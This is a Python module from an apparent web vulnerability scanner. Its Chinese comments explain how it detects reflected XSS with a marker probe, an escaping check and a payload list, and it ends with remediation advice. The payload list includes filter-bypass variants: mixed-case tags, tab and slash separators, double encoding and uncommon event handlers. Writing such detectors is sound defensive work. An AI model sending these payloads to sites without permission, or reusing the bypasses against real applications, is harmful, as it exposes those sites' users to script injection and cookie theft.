# -*- coding: utf-8 -*-
"""检测器②：反射型 XSS（零 Flask 依赖）

【判定思路】三步走，每一步都在压缩误报空间：
    ① 反射探测  注入一次性随机标记 —— 参数根本不会出现在响应里的，直接跳过
    ② 转义判定  注入 <b>标记</b> —— 看响应里是原文还是 &lt;b&gt;，
                并据此判断"未转义发生在 HTML 正文还是属性值里"
    ③ 可用性确认 注入真实攻击负载，要求**完整原文**出现在响应中才算命中
                （只有标签被吃掉一半、被转义、被截断的都不算）

【降误报设计】
    - 标记唯一：每次扫描随机生成，避免与页面原有内容撞车
    - 区分"回显"与"未转义"：负载以实体形式（&lt;script&gt;）出现不算漏洞
    - 跳过 5xx：报错页面不是有效的 XSS 上下文
    - 负载按级别从高到低尝试，命中即止（同一参数不重复报）

【对抗性变体】针对"朴素过滤"（黑名单 script/onerror 等关键词）的绕过负载：
    - 大小写混写 <ScRiPt>、事件名 <img src=x OnErRoR=…>
    - 分隔符替换   制表符分隔属性、<svg/onload=…> 用斜杠代替空格
    - 双重编码     %253Cscript%253E…（过滤器看一次解码值，应用解码两次）
    与被动侧特征库同一套攻击知识（engine/patterns.py 的 XSS_PATTERN
    与 DOUBLE_ENCODE 规则），主被动两侧互相印证。
"""
import re
from typing import Dict, List, Optional, Tuple

from ...engine.patterns import XSS_PATTERN
from ..core import Finding, ScanContext, register_detector
from .common import (ParamTarget, discover_param_targets, snippet,
                     unique_marker)

# ================================================================ 攻击负载库
# (负载模板, 级别, 上下文说明, 变体类型)
#   plain          —— 常规负载（参数值直接携带特殊字符）
#   double_encoded —— 负载先编码一次、再由客户端按"已编码"形态发送；
#                     检测时看响应里是否出现了**解码后**的完整负载
# {m} = 一次性随机标记（保证唯一性）
PAYLOADS: List[Tuple[str, str, str, str]] = [
    ('<script>alert("{m}")</script>', "high",
     "HTML 正文上下文（<script> 可直接执行）", "plain"),
    ('"><script>alert("{m}")</script>', "high",
     "双引号闭合属性值后注入 <script>", "plain"),
    ("'><script>alert(\"{m}\")</script>", "high",
     "单引号闭合属性值后注入 <script>", "plain"),
    ('<img src=x onerror=alert("{m}")>', "high",
     "img 标签 onerror 事件处理器", "plain"),
    ('<svg onload=alert("{m}")>', "high",
     "svg 标签 onload 事件处理器", "plain"),
    ('" onmouseover=alert("{m}") x="', "high",
     "属性注入（闭合引号后追加事件处理器）", "plain"),
    ('<ScRiPt>alert("{m}")</ScRiPt>', "high",
     "对抗变体：标签大小写混写（绕过大小写敏感黑名单）", "plain"),
    ('<img src=x OnErRoR=alert("{m}")>', "high",
     "对抗变体：事件名大小写混写", "plain"),
    ('<img\tsrc=x\tonerror=alert("{m}")>', "high",
     "对抗变体：制表符代替空格分隔属性", "plain"),
    ('<svg/onload=alert("{m}")>', "high",
     "对抗变体：斜杠代替空格", "plain"),
    ("<body onload=alert('{m}')>", "high",
     "body onload 事件处理器", "plain"),
    ("<details open ontoggle=alert('{m}')>", "high",
     "对抗变体：非主流事件（ontoggle，常见于黑名单遗漏）", "plain"),
    ("<a href=\"javascript:alert('{m}')\">点击</a>", "mid",
     "javascript: 伪协议", "plain"),
    ("%253Cscript%253Ealert('{m}')%253C/script%253E", "high",
     "对抗变体：双重编码（服务端二次解码后才还原为 <script>）", "double_encoded"),
]

# 转义判定探针（非攻击负载，用于判断"是否转义"与"上下文位置"）
HTML_PROBE = "<b>{m}</b>"


# ================================================================ 检测主体

@register_detector("xss", "反射型 XSS 检测",
                   "HTML 上下文 / 属性上下文 / 事件处理器 / 伪协议（含大小写与编码绕过变体）",
                   order=20)
def detect(ctx: ScanContext) -> List[Finding]:
    client = ctx.client
    findings: List[Finding] = []

    for target in discover_param_targets(ctx):
        finding = _test_target(client, target)
        if finding is not None:
            findings.append(finding)

    return findings


def _test_target(client, target: ParamTarget) -> Optional[Finding]:
    # ---------- ① 反射探测：参数不回显则无反射型 XSS 可言
    marker = unique_marker()
    probe = target.request(client, marker)
    if not probe.ok or probe.status_code >= 500 or marker not in probe.text:
        return None

    # ---------- ② 转义判定：判断未转义发生的上下文位置
    html_probe = HTML_PROBE.format(m=marker)
    probe_html = target.request(client, html_probe)
    escaped = bool(probe_html.ok) and ("&lt;b&gt;" in probe_html.text
                                       or "&amp;lt;" in probe_html.text)
    raw_html = bool(probe_html.ok) and html_probe in probe_html.text

    # ---------- ③ 可用性确认：负载必须完整原文出现在响应里
    for template, severity, context, kind in PAYLOADS:
        payload = template.format(m=marker)
        pre_encoded = kind == "double_encoded"
        resp = target.request(client, payload, pre_encoded=pre_encoded)
        if not resp.ok or resp.status_code >= 500 or not resp.text:
            continue

        if pre_encoded:
            # 双重编码：要看到"解码后"的真实负载被原样输出（应用二次解码）
            expected = payload.replace("%253C", "<").replace("%253E", ">")
        else:
            expected = payload
        if expected not in resp.text:
            continue

        signature_note = "（负载命中被动侧同一份攻击特征库 patterns.XSS_PATTERN）" \
            if XSS_PATTERN.search(expected) else ""
        return Finding(
            vuln_type="xss",
            severity=severity,
            url=target.url_with(payload, pre_encoded=pre_encoded),
            param=target.param,
            payload=payload,
            evidence=snippet(resp.text, expected),
            description=(
                f"参数 [{target.param}] 存在反射型 XSS（{context}）。"
                f"注入的脚本负载未经转义即被写入响应页面，浏览器会把它当作"
                f"页面代码执行——攻击者可窃取 Cookie、伪造操作或钓鱼。"
                f"{'响应中 HTML 被实体转义（&lt;），但该变体绕过了过滤。' if escaped else ''}"
                f"{signature_note}"),
            fix_suggestion=(
                "① 输出编码：所有回显到 HTML 的数据做上下文相关转义"
                "（正文转义 < > &，属性值外加引号并转义 \" '），"
                "用模板引擎的自动转义（Jinja2/Thymeleaf 默认开启）；"
                "② 输入校验：对参数做白名单过滤（如 id 只允许数字）；"
                "③ 部署 CSP（Content-Security-Policy）限制脚本来源作为纵深防御；"
                "④ 会话 Cookie 设置 HttpOnly，降低 XSS 成功后的危害。"),
        )

    # ---------- 兜底：标签被转义但 HTML 正文未转义（HTML 注入，级别中）
    if raw_html and not escaped:
        return Finding(
            vuln_type="xss",
            severity="mid",
            url=target.url_with(html_probe),
            param=target.param,
            payload=html_probe,
            evidence=snippet(probe_html.text, html_probe),
            description=(
                f"参数 [{target.param}] 的 HTML 标签未经转义直接输出（HTML 注入）。"
                "标签可被写入页面说明转义机制缺失，攻击者可用其他标签/事件属性"
                "构造脚本执行（部分危险标签可能被单独过滤）。"),
            fix_suggestion=(
                "① 统一使用模板引擎自动转义输出所有用户输入；"
                "② 不要依赖黑名单过滤危险标签（易被大小写/编码绕过），"
                "应采用「先转义、后放行白名单」策略。"),
        )
    return None
